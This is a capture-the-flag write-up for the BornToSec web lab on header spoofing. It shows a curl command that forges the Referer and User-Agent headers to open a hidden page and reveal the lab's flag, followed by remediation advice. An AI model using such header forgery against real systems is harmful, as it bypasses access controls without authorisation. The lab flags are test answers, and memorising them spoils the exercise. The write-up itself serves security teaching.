# Header Spoofing

## Summary

This breach is located in the hidden page linked from the footer copyright text.

The footer contains a link like:

```html
<a href="?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f">
    <li>&copy; BornToSec</li>
</a>
```

Opening this hidden page gives hints that the request must come from a specific source and use a specific browser/user agent.

By modifying HTTP headers, I was able to make the server believe the request came from the expected source.

Final flag:

```txt
f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188
```

## How I Discovered It

While inspecting the page footer, I found a hidden link:

```txt
?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f
```

The long value looked like an internal page identifier.

After opening the page, the content suggested that access depended on HTTP request headers, especially:

```txt
Referer
User-Agent
```

These headers are sent by the client, which means an attacker can modify them.

## Exploitation Approach

The server expected the request to look like it came from:

```txt
https://www.nsa.gov/
```

and expected a specific user agent:

```txt
ft_bornToSec
```

I sent the request with custom headers using curl:

```bash
curl -A "ft_bornToSec" \
  -e "https://www.nsa.gov/" \
  "http://192.168.56.101/index.php?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f"
```

Explanation:

```txt
-A sets the User-Agent header.
-e sets the Referer header.
```

Equivalent headers:

```http
User-Agent: ft_bornToSec
Referer: https://www.nsa.gov/
```

## Result

After sending the request with the expected headers, the application displayed:

```txt
The flag is : f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188
```

## Why This Is Vulnerable

The application trusts client-controlled HTTP headers for an access decision.

Headers such as:

```txt
User-Agent
Referer
```

are not reliable security controls. They are supplied by the client and can be changed using curl, browser DevTools, an intercepting proxy, or a custom script.

The server should not grant access only because a request claims to have a specific `Referer` or `User-Agent`.

## Impact

An attacker can bypass weak access restrictions by forging HTTP headers.

In a real application, this could expose hidden pages, admin-only functionality, debug panels, internal resources, or protected content.

## How To Prevent It

Recommended fixes:

- Do not use `Referer` or `User-Agent` as authentication or authorization controls.
- Use real server-side authentication.
- Use sessions with secure random session IDs.
- Enforce authorization checks on the server.
- Treat request headers as untrusted input.
- Use CSRF tokens for state-changing actions instead of relying on `Referer`.
- Log suspicious or unexpected header patterns, but do not trust them for access control.

The main lesson is:

```txt
HTTP headers are client-controlled. They can be useful context, but they must not be trusted as proof of identity or authorization.
```
